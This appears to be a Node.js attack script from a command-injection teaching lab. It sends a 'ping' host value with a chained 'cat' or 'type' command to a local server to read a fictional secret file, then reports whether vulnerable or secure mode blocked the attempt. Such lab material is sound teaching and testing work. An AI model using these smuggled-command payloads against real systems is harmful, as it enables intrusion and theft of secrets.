'use strict';

/**
 * Attack 2 — Sensitive file disclosure via injection (CWE-78).
 *
 * Same flaw, higher stakes. Instead of chaining a harmless command, we chain
 * one that reads a file the server process can see but the "ping a host"
 * feature was never meant to expose: `lab-secret.txt` (a fictional stand-in
 * for an API key / config secret, created by the server on boot).
 *
 *   Windows : 127.0.0.1 & type lab-secret.txt
 *   POSIX   : 127.0.0.1 ; cat lab-secret.txt
 *
 * In vulnerable mode the secret comes back in the HTTP response. In secure
 * mode the host fails validation and nothing runs. Local server only.
 */
const BASE = process.env.TARGET || 'http://localhost:5000';
const isWin = process.platform === 'win32';
const SEP = isWin ? '&' : ';';
const READ = isWin ? 'type lab-secret.txt' : 'cat lab-secret.txt';
const PAYLOAD = `127.0.0.1 ${SEP} ${READ}`;

async function run(host) {
  const res = await fetch(`${BASE}/run`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Accept: 'application/json' },
    body: JSON.stringify({ tool: 'ping', host }),
  });
  return res.json();
}

(async () => {
  console.log('=== Attack 2: sensitive file disclosure ===');
  console.log(`Target : ${BASE}/run`);
  console.log(`Payload: tool=ping  host="${PAYLOAD}"`);
  console.log('');

  let data;
  try {
    data = await run(PAYLOAD);
  } catch (err) {
    console.error(`Could not reach the server (${err.message}).`);
    console.error('Start it first with:  npm run start:vulnerable');
    process.exit(1);
  }

  const r = data.result;
  console.log(`Server mode : ${data.secure ? 'SECURE' : 'VULNERABLE'}`);

  if (!r.ran) {
    console.log(`Guard       : BLOCKED — ${r.guard.reason}`);
    console.log('\nResult: disclosure PREVENTED. The file-read command never ran.');
    return;
  }

  console.log(`Command run : ${r.commandShown}`);
  const out = `${r.stdout}\n${r.stderr}`.trim();
  console.log('\n--- captured output ---');
  console.log(out || '(none)');
  console.log('-----------------------');

  if (out.includes('DRUKCONSOLE_API_KEY')) {
    console.log(
      '\nResult: disclosure SUCCEEDED. The server returned the contents of' +
        '\nlab-secret.txt — including the (fictional) API key — through a feature' +
        '\nthat only exists to ping a host.'
    );
  } else {
    console.log('\nResult: the secret was not returned — disclosure did NOT succeed in this mode.');
  }
})();
